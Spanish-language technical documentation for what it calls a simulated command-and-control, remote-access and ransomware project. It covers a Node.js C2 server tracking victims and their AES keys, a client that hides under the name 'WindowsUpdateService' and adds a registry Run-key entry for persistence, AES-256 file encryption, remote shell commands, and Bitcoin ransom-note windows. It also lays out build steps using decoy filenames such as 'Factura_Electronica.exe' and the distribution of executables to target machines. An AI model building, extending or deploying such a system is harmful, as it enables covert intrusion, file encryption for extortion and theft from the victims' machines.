# Documentación Técnica del Proyecto de Seguridad C2

## Descripción General
Este proyecto implementa un sistema de Comando y Control (C2) avanzado con capacidades de Acceso Remoto (RAT) y simulación de Ransomware. El sistema está diseñado para demostrar vulnerabilidades y mecanismos de persistencia, cifrado y exfiltración de datos en un entorno controlado (Windows).

El núcleo del sistema consta de un servidor centralizado (C2) basado en Node.js que gestiona múltiples clientes "víctima" infectados. El servidor ofrece un panel de control web en tiempo real para monitorear infecciones, administrar claves de cifrado y enviar comandos remotos. Los clientes, ejecutándose en las máquinas víctima, mantienen una conexión persistente vía WebSocket, permitiendo la ejecución de comandos de shell, cifrado de archivos (AES-256) y despliegue de notas de rescate (PyQt6/Tkinter).

## Arquitectura del Sistema

### Sistema de Cifrado Híbrido
El sistema implementa un esquema de cifrado híbrido robusto para garantizar que solo el servidor C2 posea la capacidad de descifrar los archivos de la víctima.

1.  **RSA (Asimétrico):**
    *   Al iniciar, el servidor genera un par de claves RSA-2048 (Pública y Privada).
    *   La **Clave Pública** se distribuye a los clientes o se utiliza en el servidor para cifrar las claves AES de los clientes antes de almacenarlas.
    *   La **Clave Privada** permanece *únicamente* en el servidor y nunca se comparte, garantizando que el descifrado solo sea posible con acceso al servidor.
2.  **AES (Simétrico):**
    *   Cada cliente genera (o recibe) una clave AES-256 única.
    *   Esta clave se utiliza para el cifrado rápido de archivos locales.
    *   La clave AES se envía al servidor cifrada con RSA (o se almacena localmente cifrada) para su custodia.

### Esquema y Persistencia de la Base de Datos
El sistema utiliza **Supabase** (PostgreSQL) para la persistencia de datos, asegurando que la información de las víctimas y sus claves sobreviva a reinicios del servidor.

**Tablas Principales:**
*   `victims`: Almacena metadatos de la víctima (UUID, Hostname, IP, SO).
*   `keys`: Almacena la clave AES de cada víctima.
    *   `aes_key`: La clave AES en texto plano (accesible solo por el panel de admin).
    *   `encrypted_aes_key`: La clave AES cifrada con la RSA pública del servidor.
*   `encrypted_files`: Registro de auditoría de cada archivo cifrado (Ruta, Nombre Original, IV usado).

## Servidor C2 (server.js)
El servidor actúa como el cerebro de la operación, manejando comunicaciones HTTP y WebSocket.

### API HTTP Express
El servidor expone endpoints REST para el panel de control y funcionalidades auxiliares:
*   `GET /api/status`: Estado de salud del servidor.
*   `POST /api/ejecutar`: Ejecución de comandos arbitrarios en la máquina local del servidor.
*   `GET /api/db/victims`: Listado de víctimas registradas.
*   `GET /api/db/keys`: Recuperación de claves de cifrado.
*   `POST /api/db/victims/delete`: Eliminación de víctimas y borrado en cascada de sus claves.

### Sistema de Eventos Socket.IO
La comunicación en tiempo real se maneja con `socket.io`.
```javascript
// server.js - Inicialización de Socket.IO
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

io.on('connection', (socket) => {
    // Manejo de registro de nueva víctima
    socket.on('register', async (data) => {
        // ... Lógica de registro y asignación de UUID
        saveVictim({ ...data, socketId: socket.id });
    });
    
    // Recepción de resultados de comandos
    socket.on('comando-resultado', (data) => {
        // ... Log y actualización de UI
    });
});
```

### Gestión y Recuperación de Claves
El servidor implementa una lógica inteligente para garantizar que una víctima siempre use la misma clave AES, incluso después de reinicios o reinstalaciones.
1.  **Verificación en DB:** Al conectar, busca si el UUID ya tiene clave en Supabase.
2.  **Recuperación Local:** Si no hay DB, busca en archivos locales del servidor.
3.  **Generación:** Si es nuevo, genera una clave segura de 32 bytes y la almacena.

```javascript
// server.js - Lógica de obtención de clave
async function obtenerClaveCliente(clienteId, clienteName, uuid) {
  // 1. Intentar recuperar de Supabase (Evita duplicados)
  if (supabase) {
      // ... query a tabla 'keys'
  }
  // 2. Intentar recuperar de archivo local
  // ...
  // 3. Generar nueva si no existe
  return generarClaveCliente(clienteId, clienteName).key;
}
```

### Gestión de la Conexión del Cliente
Se mantiene un mapa en memoria `clientesConectados` para un acceso rápido, sincronizado con la base de datos para el estado histórico. El servidor detecta desconexiones y actualiza el estado visual en el panel.

## Cliente RAT (cliente.js)
El cliente es un script de Node.js diseñado para ejecutarse sigilosamente en la máquina objetivo.

### Mecanismos de Persistencia
El cliente asegura su ejecución automática al inicio del sistema modificando el Registro de Windows y copiándose a una ubicación oculta.
```javascript
// cliente.js - Instalación de persistencia
const REG_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
const REG_VALUE = 'WindowsUpdateService'; // Nombre falso para camuflaje

function instalarPersistencia() {
    // Copia el ejecutable a Update/WindowsUpdateService.exe
    // Agrega la entrada al registro usando comando 'reg add'
    const comando = `reg add "${REG_KEY}" /v "${REG_VALUE}" /t REG_SZ /d "${targetPath}" /f`;
    exec(comando, ...);
}
```

### Motor de Cifrado de Archivos
Utiliza el módulo nativo `crypto` de Node.js para un rendimiento óptimo. Cifra usando algoritmo AES-256-CBC con un Vector de Inicialización (IV) aleatorio por archivo.
```javascript
// cliente.js - Función de cifrado
function cifrarConAES(data, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
    // ...
}
```

### Sistema de Ejecución de Comandos
El cliente escucha comandos del servidor e interpreta instrucciones especiales (`c2:encrypt`, `c2:scan`) o ejecuta comandos de shell estándar.
```javascript
// cliente.js - Shell Persistente
function ejecutarComando(comando) {
    // Manejo de comandos internos del C2
    if (comando === 'c2:scan') return escanearArchivos(...);
    
    // Ejecución de comandos de sistema
    exec(comando, { cwd: currentWorkingDir }, ...);
}
```

### Fallo y Reconexión del Servidor
El cliente incluye lógica de re-intento con múltiples servidores de respaldo (Render.com, Localhost, IP LAN) para garantizar la conectividad si el servidor principal cae.

## Panel de Control Web
La interfaz web (ubicada en `public/`) permite la administración completa del sistema.

### Panel de Control Principal (index.html)
Vista general del estado del servidor y logs de actividad.
*   Muestra el estado de conexión a la base de datos.
*   Terminal de logs del servidor en tiempo real.

### Interfaz de Ejecución de Kill Chain (seguridad.html)
Proporciona herramientas ofensivas y defensivas:
*   Generador de payloads.
*   Visualizador de estructura de archivos remota.
*   Ejecución de scripts de análisis.

### Visor de Bases de Datos (database.html)
Interfaz CRUD para gestionar las tablas de Supabase directamente desde el panel.
*   Tabla de Víctimas: Ver estado, eliminar registros.
*   Tabla de Claves: Ver claves AES asignadas, copiar claves para descifrado manual.
*   Tabla de Archivos: Auditoría de archivos cifrados.

### Interfaces de Notas de Rescate
Aplicaciones gráficas independientes (compiladas a `.exe`) que se muestran a la víctima.
*   **PyQt6 (interfazdeaviso.py):** Versión moderna para Windows 10/11 con temporizador, escudo SVG y validación de pago Bitcoin simulada.
*   **Tkinter (interfazdeaviso_tk.py):** Versión heredada ("Legacy") compatible con Windows 7/8.

## Construir Sistema
El proyecto incluye un script de orquestación `build.js` que automatiza la compilación de todos los componentes.

### Orquestación de build.js
1.  Limpia compilaciones previas.
2.  Invoca `pkg` para compilar el cliente Node.js.
3.  Invoca `PyInstaller` para compilar las notas de rescate (versión moderna y legacy).
4.  Intenta usar nombres de archivo disuasorios (ej. `Factura_Electronica.exe`).

### Compilación de Clientes
El cliente se empaqueta en un ejecutable único (standalone) que incluye el runtime de Node.js, listo para ejecutarse sin dependencias en la víctima.

### Compilación de Notas de Rescate
Se generan ejecutables Python `onefile` sin consola (`--noconsole`) para que aparezcan como aplicaciones GUI nativas limpias.

## Implementación

### Implementación del Servidor (Render.com)
Configurado a través de `render.yaml` o despliegue directo de Node.js.
*   Variables de entorno: `SUPABASE_URL`, `SUPABASE_KEY` requeridas en producción.

### Distribución de Clientes
Los ejecutables generados en `dist/` se distribuyen a las máquinas objetivo. Al ejecutarse, inician el proceso de infección:
1.  Instalación de persistencia.
2.  Conexión al servidor C2.
3.  Descarga de clave de cifrado.
4.  Espera de comandos.

## Procedimientos Operativos

### Configuración Inicial
1.  Clonar repositorio e instalar dependencias: `npm install`.
2.  Configurar credenciales de Supabase en `.env`.
3.  Ejecutar el servidor local: `node server.js`.
4.  Ejecutar `node build.js` para generar los artefactos (cliente y notas).

### Gestión de Víctimas
Desde el panel web, el operador puede ver las víctimas en línea (verde) o desconectadas (rojo). Se puede seleccionar una víctima específica para abrir una sesión de terminal remota.

### Procedimientos de Recuperación
Si una víctima paga el rescate (simulado):
1.  El operador recupera la clave AES desde el panel `database.html`.
2.  Se envía el comando `c2:decrypt` a la víctima, o se utiliza la herramienta de descifrado manual con la clave recuperada.

### Gestión de Bases de Datos
El sistema mantiene un registro histórico. Es responsabilidad del operador depurar periódicamente las víctimas antiguas o de prueba usando el botón "Eliminar" en el visor de base de datos para mantener el rendimiento.
